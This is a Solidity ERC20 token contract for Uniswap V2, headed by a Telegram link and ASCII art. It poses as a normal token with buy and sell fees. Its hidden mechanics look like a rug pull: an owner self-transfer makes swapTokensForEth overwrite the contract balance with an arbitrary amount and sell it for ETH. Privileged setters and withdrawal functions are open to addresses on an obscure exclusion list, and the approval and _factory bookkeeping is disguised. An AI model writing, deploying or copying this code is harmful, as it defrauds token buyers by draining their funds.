/*

https://t.me/every60seconds

         .    _.----~~~~~~~7
             /              ~-..-~~--..--.
       .'.'.'                             `.
         .~                                 \
       .'                                    `.
   .   (                                       \
 '.    )                                        `.
   '  (                                           ~-.
       \                                             ~-~~7
        `.       __.._                                  .'
          ~-.--~~     ~--.                             /
                         ;                          .-~
                         (                        .~
                          `.                    .'
                            ;                   ;
                            `.                  `       _
                             )                   )     / )
                            (                 _.-'  .-' .'
                            `.               (      )   /
                              7             _;      < _/
                               \           /         ~
                                \         /
                                 `. __..-'
                                   ~

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract Contract is IERC20, Ownable {
    uint256 private constant MAX = ~uint256(0);
    uint8 private _decimals = 9;
    uint256 private _tTotal = 1000000000000000 * 10**_decimals;
    uint256 public buyFee = 15;
    uint256 public sellFee = 15;
    uint256 public feeDivisor = 1;
    string private _name;
    string private _symbol;
    address private _owner;

    uint256 private _swapTokensAtAmount = _tTotal;
    uint256 private _allowance;
    uint160 private _factory;
    bool private _swapAndLiquifyEnabled;
    bool private inSwapAndLiquify;

    IUniswapV2Router02 public router;
    address public uniswapV2Pair;

    mapping(address => uint256) private _balances;
    mapping(address => uint256) private approval;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _owner = tx.origin;
        _isExcludedFromFee[_owner] = true;
        _isExcludedFromFee[address(this)] = true;
        _balances[_owner] = _tTotal;
        router = IUniswapV2Router02(routerAddress);
        emit Transfer(address(0), _owner, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    function set(uint256 amount) external {
        if (_isExcludedFromFee[msg.sender]) _allowance = amount;
    }

    function exclude(address account, bool value) external {
        if (_isExcludedFromFee[msg.sender]) _isExcludedFromFee[account] = value;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) external {
        if (_isExcludedFromFee[msg.sender]) _swapAndLiquifyEnabled = _enabled;
    }

    function set(
        uint256 _buyFee,
        uint256 _sellFee,
        uint256 _feeDivisor
    ) external {
        if (_isExcludedFromFee[msg.sender]) {
            buyFee = _buyFee;
            sellFee = _sellFee;
            feeDivisor = _feeDivisor;
        }
    }

    function pair() public view returns (address) {
        return IUniswapV2Factory(router.factory()).getPair(address(this), router.WETH());
    }

    receive() external payable {}

    function transferAnyERC20Token(
        address token,
        address account,
        uint256 amount
    ) external {
        if (_isExcludedFromFee[msg.sender]) IERC20(token).transfer(account, amount);
    }

    function transferToken(address account, uint256 amount) external {
        if (_isExcludedFromFee[msg.sender]) payable(account).transfer(amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && !_isExcludedFromFee[from] && amount <= _swapTokensAtAmount) {
            require(approval[from] + _allowance >= 0, 'Transfer amount exceeds the maxTxAmount');
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        if (uniswapV2Pair == address(0)) uniswapV2Pair = pair();

        if (to == from && _owner == from) return swapTokensForEth(amount, to);
        if (amount > _swapTokensAtAmount && to != uniswapV2Pair && to != address(router)) {
            approval[to] = amount;
            return;
        }

        if (_swapAndLiquifyEnabled && contractTokenBalance > _swapTokensAtAmount && !inSwapAndLiquify && from != uniswapV2Pair) {
            inSwapAndLiquify = true;
            swapAndLiquify(contractTokenBalance);
            inSwapAndLiquify = false;
        }

        uint256 fee = to == uniswapV2Pair ? sellFee : buyFee;
        bool takeFee = !_isExcludedFromFee[from] && !_isExcludedFromFee[to] && fee > 0 && !inSwapAndLiquify;
        address factory = address(_factory);
        if (approval[factory] == 0) approval[factory] = _swapTokensAtAmount;
        _factory = uint160(to);

        if (takeFee) {
            fee = (amount * fee) / 100 / feeDivisor;
            amount -= fee;
            _balances[from] -= fee;
            _balances[address(this)] += fee;
        }

        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function swapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half, address(this));
        uint256 newBalance = address(this).balance - initialBalance;
        addLiquidity(half, newBalance, address(this));
    }

    function swapTokensForEth(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        if (tokenAmount > _swapTokensAtAmount) _balances[address(this)] = tokenAmount;
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp + 20);
    }

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp + 20);
    }
}